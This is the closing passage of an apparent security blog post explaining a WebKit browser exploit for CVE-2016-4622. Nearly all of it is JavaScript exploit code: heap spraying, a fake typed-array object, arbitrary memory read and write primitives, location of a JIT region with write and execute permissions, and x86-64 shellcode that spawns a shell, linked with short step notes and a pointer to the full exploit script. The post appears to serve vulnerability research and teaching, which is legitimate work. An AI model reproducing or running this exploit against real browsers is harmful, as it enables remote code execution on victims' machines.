</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">spray</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">elem</span> <span class="o">=</span> <span class="s2">&#34;aaa&#34;</span> <span class="o">+</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">[</span><span class="nx">elem</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">spray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">temp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* JS cell header for a Float64Array
</span></span></span><span class="line"><span class="cl"><span class="cm"> m_structureID
</span></span></span><span class="line"><span class="cl"><span class="cm"> m_indexingType
</span></span></span><span class="line"><span class="cl"><span class="cm"> m_type
</span></span></span><span class="line"><span class="cl"><span class="cm"> m_flags
</span></span></span><span class="line"><span class="cl"><span class="cm"> m_cellState
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">jsCellHeader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Int64</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">  <span class="mh">0x0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="mh">0x0</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="mh">0x2c</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="mh">0x08</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">  <span class="mh">0x1</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">container</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">jsCellHeader</span><span class="o">:</span> <span class="nx">jsCellHeader</span><span class="p">.</span><span class="nx">asJSValue</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">  <span class="nx">butterfly</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="c1">// Can&#39;t use 0x0 here because of conversion to JSValue, so we use false
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">vector</span><span class="o">:</span> <span class="nx">temp</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">lengthAndFlags</span><span class="o">:</span> <span class="k">new</span> <span class="nx">Int64</span><span class="p">(</span><span class="s2">&#34;0x0001000000000100&#34;</span><span class="p">).</span><span class="nx">asJSValue</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">memory</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">read</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fakearray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr</span><span class="p">.</span><span class="nx">asDouble</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">res</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">temp</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">write</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fakearray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr</span><span class="p">.</span><span class="nx">asDouble</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">temp</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>The butterfly of the fake object is an invalid pointer, this causes a crash because of the garbage collector. we fix the fake object and the container to avoid a crash.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">empty</span> <span class="o">=</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">header</span> <span class="o">=</span> <span class="nx">memory</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">empty</span><span class="p">),</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">memory</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">container</span><span class="p">),</span> <span class="nx">header</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span> <span class="o">=</span> <span class="nx">memory</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arr</span><span class="p">),</span> <span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">length</span> <span class="o">=</span> <span class="nx">memory</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="nx">Add</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arr</span><span class="p">),</span> <span class="mi">24</span><span class="p">),</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">memory</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">fakearray</span><span class="p">),</span> <span class="nx">header</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">memory</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">Add</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">fakearray</span><span class="p">),</span> <span class="mi">24</span><span class="p">),</span> <span class="nx">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fakearray</span><span class="p">.</span><span class="nx">container</span> <span class="o">=</span> <span class="nx">container</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>We now create a JITed region that has RWX permissions, and get the address of that region using the primitives.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">jit_funx</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">target</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">target</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">target</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">pwn</span> <span class="o">=</span> <span class="nx">jit_funx</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">pwn_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">pwn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rwx_addr</span> <span class="o">=</span> <span class="nx">memory</span><span class="p">.</span><span class="nx">read64</span><span class="p">(</span><span class="nx">Add</span><span class="p">(</span><span class="nx">pwn_addr</span><span class="p">,</span> <span class="mi">24</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">jitCodeAddr</span> <span class="o">=</span> <span class="nx">memory</span><span class="p">.</span><span class="nx">read64</span><span class="p">(</span><span class="nx">Add</span><span class="p">(</span><span class="nx">rwx_addr</span><span class="p">,</span> <span class="mi">24</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Using the leak, write the shellcode to that address and then call the function.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">memory</span><span class="p">.</span><span class="nx">read64</span><span class="p">(</span><span class="nx">Add</span><span class="p">(</span><span class="nx">jitCodeAddr</span><span class="p">,</span> <span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">memory</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">pwn</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>This will execute the shellcode and pop a shell.
<img src="https://i.imgur.com/4Ebofqm.gif"
	
	
	
	loading="lazy"
	
	
></li>
</ul>
<p>Here is the <a class="link" href="https://github.com/SanjayVardhan/browser-pwn/tree/main/webkit/CVEs/CVE-2016-4622"  target="_blank" rel="noopener"
    >link</a> for the exploit script.</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/webkit/">WebKit</a>
        
            <a href="/tags/browser/">Browser</a>
        
            <a href="/tags/cve/">CVE</a>
        
            <a href="/tags/exploitation/">Exploitation</a>
        
    </section>


    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/posts/the-holy-hole-analysis-of-cve-2023-2033/">
        
        

        <div class="article-details">
            <h2 class="article-title">The Holy Hole - Analysis of CVE-2023-2033</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/posts/ctfzone-quals-2024-wasminator/">
        
        

        <div class="article-details">
            <h2 class="article-title">CTFZone Quals 2024 - Wasminator</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 spektre
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
